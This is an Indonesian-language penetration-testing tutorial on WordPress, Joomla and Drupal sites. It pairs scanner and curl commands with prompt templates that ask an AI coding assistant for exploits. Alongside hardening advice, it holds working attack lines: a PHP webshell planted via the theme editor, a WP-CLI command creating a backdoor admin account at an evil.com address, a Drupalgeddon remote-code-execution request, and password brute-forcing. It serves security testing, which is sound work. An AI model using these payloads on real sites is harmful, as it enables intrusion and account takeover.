# Skenario 10 (Tambahan): Aplikasi Berbasis CMS

**Berlaku untuk:** Semua environment (lokal, internal, internet)  
**CMS yang dibahas:** WordPress, Joomla, Drupal  
**Mengapa perlu tutorial khusus:** Attack surface CMS sangat unik dan berbeda dari aplikasi custom

---

## Mengapa CMS Perlu Pendekatan Khusus

- **WordPress** menguasai ~43% web dunia → target paling umum
- Plugin/theme dari pihak ketiga → attack surface besar yang sulit dikontrol
- Struktur URL, file path, dan database schema sudah diketahui
- Tools khusus tersedia (WPScan, droopescan, joomscan)
- Default configuration sering tidak secure

---

## WordPress Penetration Testing

### Phase 1: WordPress Fingerprinting

```bash
# Konfirmasi WordPress dan dapatkan versi
curl -s https://target.co.id/ | grep -i "wp-content\|wordpress"
curl -s https://target.co.id/wp-login.php | grep "ver="
curl -s https://target.co.id/readme.html
curl -s https://target.co.id/wp-includes/version.php  # jika directory listing

# Meta generator di source
curl -s https://target.co.id/ | grep "generator"
# <meta name="generator" content="WordPress 6.1.1" />
```

### Phase 2: WPScan — WordPress Security Scanner

```bash
# Basic scan (tanpa API key)
wpscan --url https://target.co.id \
  --enumerate u,p,t,tt \  # users, plugins, themes, timethumbs
  -o scans/web/wpscan_basic.txt

# Dengan API key (lebih banyak vulnerability data)
wpscan --url https://target.co.id \
  --api-token YOUR_WPSCAN_API_KEY \
  --enumerate u,vp,vt,tt,cb,dbe \
  -o scans/web/wpscan_full.txt

# Aggressive scan
wpscan --url https://target.co.id \
  --detection-mode aggressive \
  --enumerate ap,at,u1-100 \
  --passwords /usr/share/wordlists/rockyou.txt \
  --usernames admin,administrator,editor
```

**Prompt Claude Code:**
```
WPScan output dari WordPress di target.co.id:

WordPress version: 6.1.1 (out of date)
Vulnerable plugins found:
- Contact Form 7 v5.7.1 — CVE-2022-XXXX (File Upload)
- WooCommerce v6.0.0 — CVE-2022-YYYY (SQL Injection)

Users enumerated: admin, editor, author

Untuk setiap temuan:
1. CVE detail dan CVSS score
2. Cara eksploitasi manual step-by-step
3. PoC code atau curl command
4. Apakah ada Metasploit modul yang tersedia?
```

### Phase 3: WordPress-Specific Vulnerabilities

```bash
# User enumeration via author archive
curl -s "https://target.co.id/?author=1" -L | grep -i "author"
curl -s "https://target.co.id/wp-json/wp/v2/users"  # REST API user enum

# XML-RPC — brute force via multicall
curl -X POST https://target.co.id/xmlrpc.php \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
<methodCall>
  <methodName>system.listMethods</methodName>
  <params></params>
</methodCall>'

# Config file backup
curl -s https://target.co.id/wp-config.php.bak
curl -s https://target.co.id/wp-config.php~
curl -s https://target.co.id/.wp-config.php.swp

# Debug log
curl -s https://target.co.id/wp-content/debug.log
```

**Prompt Claude Code:**
```
WordPress REST API endpoint /wp-json/wp/v2/users memberikan response:
[
  {"id": 1, "name": "Admin", "slug": "admin", "link": "..."},
  {"id": 2, "name": "John Doe", "slug": "johndoe", ...}
]

Dan XML-RPC tersedia (listMethods mengembalikan 80+ methods).

Buatkan:
1. Wordlist brute force attack via XML-RPC multicall (lebih cepat dari biasa)
2. Python script untuk XML-RPC brute force dengan 100 attempts per request
3. Cara disable XML-RPC dari dalam WordPress (untuk laporan rekomendasi)
4. Jika dapat credentials, apa langkah selanjutnya untuk RCE?
```

### Phase 4: Plugin Exploitation

```bash
# Upload webshell via vulnerable plugin (jika ada file upload vuln)
# Contoh: Contact Form 7 file upload bypass

# Atau via theme editor (jika dapat admin access)
# Buka Appearance > Theme Editor > 404.php
# Tambahkan: <?php system($_GET['cmd']); ?>
# Akses: https://target.co.id/wp-content/themes/theme/404.php?cmd=id

# WP-CLI jika ada akses SSH
wp --path=/var/www/html user create hacker hacker@evil.com \
  --role=administrator --user_pass=Hacked123!
```

---

## Joomla Penetration Testing

```bash
# Joomscan
perl joomscan.pl -u https://target.co.id \
  --enumerate-components \
  -o scans/web/joomscan.txt

# Manual checks
curl -s https://target.co.id/administrator/  # Admin panel
curl -s https://target.co.id/configuration.php  # Config (seharusnya blank)
curl -s https://target.co.id/README.txt        # Version info
```

**Prompt Claude Code:**
```
Joomscan menemukan Joomla 3.9.26 di target.co.id.
Components: com_content, com_users, com_contact, com_phocadownload

Identifikasi:
1. Joomla 3.x CVE yang critical
2. com_phocadownload — apakah ada kerentanan file download?
3. Default admin path dan cara brute force
4. SQL injection pada komponen Joomla yang umum
```

---

## Drupal Penetration Testing

```bash
# Droopescan
droopescan scan drupal -u https://target.co.id \
  -t 8 --output-format=json > scans/web/droopescan.json

# Drupalgeddon check (CVE-2018-7600)
curl -s "https://target.co.id/?q=user/password&name[%23post_render][]=passthru&name[%23markup]=id&name[%23type]=markup" \
  -d "form_id=user_pass&_triggering_element_name=name&_triggering_element_value=&opz=E-mail+new+Password"
```

---

## Claude Code Workflow untuk CMS Testing

**Prompt Master untuk CMS:**
```
Saya melakukan pentest pada CMS di target.co.id.
CMS: [WordPress/Joomla/Drupal]
Versi: [VERSI]
Plugin/Component yang terdeteksi: [LIST]

Buatkan:
1. Checklist pentest spesifik untuk CMS ini
2. Tools yang paling efektif untuk CMS ini
3. Top 5 CVE yang relevan dengan versi ini
4. Cara mendapatkan RCE dari authenticated user
5. Cara mendapatkan RCE dari unauthenticated (jika ada)
6. Post-exploitation setelah akses ke admin panel
```

---

## Checklist CMS Pentest

```
[ ] Identifikasi CMS dan versi tepat
[ ] Jalankan tool khusus (WPScan/Joomscan/Droopescan)
[ ] Enumerate users (REST API, author archive, brute force)
[ ] Enumerate plugins/themes/components dan versinya
[ ] Cek CVE untuk setiap komponen
[ ] Test XML-RPC atau API untuk brute force
[ ] Cari file sensitif (config backup, debug log)
[ ] Test file upload via vulnerable plugin
[ ] Jika dapat admin: upload webshell via theme editor
[ ] Cek outdated core dan rekomendasi update
[ ] Laporan: sertakan link ke CVE dan patch tersedia
```

---

## Rekomendasi Remediation CMS

**Prompt Claude Code:**
```
Buatkan checklist hardening WordPress untuk laporan rekomendasi:
1. Core, plugin, theme: update policy
2. User management: rename admin, 2FA
3. XML-RPC: disable jika tidak dibutuhkan
4. REST API: restrict akses endpoint sensitif
5. File permission yang benar
6. .htaccess security rules
7. Plugin keamanan yang direkomendasikan (Wordfence, iThemes)
8. Backup strategy
Format sebagai checklist markdown yang bisa langsung diberikan ke client
```
